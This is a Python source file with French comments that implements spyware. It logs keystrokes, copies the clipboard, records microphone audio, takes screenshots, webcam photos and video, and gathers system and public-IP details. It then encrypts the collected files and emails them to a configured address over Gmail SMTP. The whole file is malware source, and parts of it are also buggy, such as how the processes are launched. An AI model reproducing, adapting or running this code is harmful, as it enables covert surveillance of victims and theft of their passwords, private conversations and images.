# Importtation des librairies nécéssaires
# Pour les emails
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import  encoders
import smtplib

# Pour la collecte des informations sur la machine
import socket
import platform

# Pour presse-papiers
import win32clipboard # Presse papier sous windows

# Pour les saisies au clavier
from pynput.keyboard import Key, Listener 

# Pour le temps
import time
import os
    
# Pour le micro(son)
from scipy.io.wavfile import write
import sounddevice  as sd

# Pour le chiffrement des infos
from cryptography.fernet import Fernet
from requests import get # Pour les requêtes
import multiprocessing # pour des processus en parallele

# Pour la capture d'écran
from PIL import ImageGrab  

# Pour la prise de photo et l'enregistrement de la vidéo
import cv2

# Les variables pour reccueillir les données collectées
info_saisies = "info_saisies.txt"
info_systeme = "info_systeme.txt"
presse_papier = "presse_papier.txt"
microphone_time = 60
enreg = "audio.wav"
capture = "capture_ecran.png"
video_enreg = "video.avi"
photo_enreg = "photo.jpg"

# Cle pour le chiffrement
cle = " "

# Les variables pour reccueillir les données chiffrées
info_saisies_chiffrer = "info_saisies_chiffrer.txt" 
info_systeme_chiffrer = "info_systeme_chiffrer.txt"
presse_papier_chiffrer = "presse_papier_chiffrer.txt"
video_chiffrer = "video_chiffrer.avi"
photo_chiffrer = "photo_chiffer.jpg"
capture_chiffrer = "capture_chiffrer.png"
enreg_chiffrer = "enreg_chiffrer.wav"

# Emetteur - Recepteur pour l'envoi des emails
email_emetteur = " " #Mon email
mot_de_passe = " " # Mon mot de passe
email_recepteur = " "

# Les variables pour gérer les chemins d'accès
chemin_projet = " " #Chemin du projet
separateur = " "
chemin = chemin_projet + separateur

# Autres variables
temps = 60         # Temps d'enregistrement d'un audio en secondes
saisies = []       # pour enregistrer les saisies au clavier
compteur = 0
start_time = time.time()


# La pour recuperer les infos du systeme
def info_machine():
    
    # ouvrir le fichier info_systeme et y ecrire les infos recuperer
    with open(chemin_projet + separateur + info_systeme, 'a') as f:
        hostname = socket.gethostname()
        adresse_ip = socket.gethostbyname(hostname)
        try:
            adresse_public = get("https://api.ipify.org").text
            f.write("Adresse Public: " + adresse_public + '\n')

        except Exception:
            f.write("Ne peut recupérer l'addresse pubic." + '\n')

        f.write("Precesseur: " + (platform.processor()) + '\n')
        f.write("Systeme: " + platform.system() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Nom de la machine: " + hostname + '\n')
        f.write("Adresse IP privé: " + adresse_ip + '\n')

        print(" --- Je viens de recolter les informations sur ta machine ---")


# La fonction pour copier le contenu du presse-papiers
def presse_papiers():

    with open(chemin_projet + separateur + presse_papier, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            donnee_copie = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Données Copiés: " + donnee_copie + '\n')

        except Exception:
            f.write("Les données ne sont pas copiées.")
    print(" --- Je viens de copier le contenu du presse-papiers ---")

# La fonction pour recuprerer le son
def microphone():
    print(" --- J'ai commencé l'enregistrement audio ---")
    fs = 44100        # fréquence d'échantillonnage
    secondes = temps     # durée (60 sec = 1 minute)

    # Enregistre 60 * 44100 échantillons = 1 minute
    enregistrement = sd.rec(int(secondes * fs), samplerate=fs, channels=2)
    sd.wait()
    write(chemin_projet + separateur + enreg, fs, enregistrement)
    print(" --- J'ai fini l'enregistrement audio ---")

# La fonction pour faire des captures d'ecran
def capture_ecran():
    image = ImageGrab.grab()
    image.save(chemin_projet + separateur + capture)

    print(" --- Je viens de faire une capture de ton écran ---")

# La fonction pour enregistrer une video
def video():
    print(" --- J'ai commencé par enregistrer une vidéo ---")
    # Ouvre la caméra
    cap = cv2.VideoCapture(0)
    # Définition du codec et du fichier de sortie
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("video.avi", fourcc, 20.0, (640, 480))

    start_time = time.time()   # Heure de début

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        out.write(frame)                 # Enregistre le frame
        cv2.imshow("Enregistrement", frame)

        # Arrête après 60 secondes
        if time.time() - start_time >= temps:
            break

    cap.release()
    out.release()
    cv2.destroyAllWindows()
    print(" --- J'ai fini l'enregistrement de la vidéo ---")

# La fonction pour prendre une photo
def photo():
    cap = cv2.VideoCapture(0)  # 0 = webcam par défaut
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("photo.jpg", frame)
    cap.release()

    print(" --- Je viens de te prendre en photo ---")

# La fonction pour enregistrer les saisies au clavier
def saisir():    
    print(" --- J'ai commencé par enregistrer tout ce que tu saisis au clavier ---")
    def on_press(saisie):
        global saisies, compteur
        # Ajout de la la saisie
        saisies.append(saisie)
        compteur += 1

        if compteur >=1 :
            compteur = 0
            write_file(saisies)
            saisies = []

    # La fonction pour ecrire 
    def write_file(saisies):
        with open(chemin_projet + separateur + info_saisies, 'a') as f:
            for saisie in saisies:
                i = str(saisie).replace("'","")
                #gestion des exceptions
                if i.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif i.find("saisie") == -1:
                    f.write(i)
                    f.close()

    def on_release(saisie):
        if saisie == Key.esc: #exception
            return False

    with Listener(on_press=on_press, on_release=on_release)as listner:
        listner.join() 
  
# La fonction pour envoyer les infos par emails
def envoi_email(nom_fichier, message, email_recepteur):

    emetteur = email_emetteur

    msg = MIMEMultipart()
    msg ['From'] = emetteur
    msg ['To'] = email_recepteur
    msg ['Subject'] = "Fichier des Infos" # Objet du mail

    corps = "Corps du mail"

    msg.attach(MIMEText(corps, 'plain'))

    nom_fichier = nom_fichier
    message = open(message, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((message).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "message: nom_fichier= %s" % nom_fichier)
    msg.attach(p)

    s =smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_emetteur, mot_de_passe) #Connexion à notre compte email

    texte = msg.as_string()
    s.sendmail(email_emetteur,email_recepteur, texte)
    print(" --- Je t'ai envoyé un email ---")
    s.quit()

# Appel de toutes les fonctions
def run():
    print("*** LANCEMENT DU PROGRAMME ***")    
    processes = []

    functions = [saisir(), presse_papiers(), photo(), video(), info_machine(), microphone(), capture_ecran()]
    
    # Créer et démarrer un processus pour chaque fonction
    for func in functions:
        process = multiprocessing.Process(target=func)
        processes.append(process)
        process.start()
    
    # Attendre que tous les processus se terminent
    for process in processes:
        process.join()
    
    print("Tous les processus sont terminés !")

if __name__ == "__main__":
    run()


# Chiffrement des données

fichier_a_chiffrer = [chemin+info_saisies, chemin+info_systeme, chemin+presse_papier, chemin+photo_enreg, chemin+enreg, chemin+video_enreg, chemin+capture]
fichier_chiffrer = [chemin+info_saisies_chiffrer, chemin+info_systeme_chiffrer, chemin+presse_papier_chiffrer, chemin+photo_chiffrer, chemin+enreg_chiffrer, chemin+video_chiffrer, chemin+capture_chiffrer]

i = 0
for elt in fichier_a_chiffrer:
    with open(fichier_a_chiffrer[i], 'rb') as f:
        data = f.read()
    
    fernet = Fernet(cle)
    chiffrer = fernet.encrypt(data)
    
    with open(fichier_chiffrer[i], 'wb') as f:
        f.write(chiffrer)
        envoi_email(fichier_chiffrer[i], fichier_chiffrer[i], email_recepteur)
    i+=1


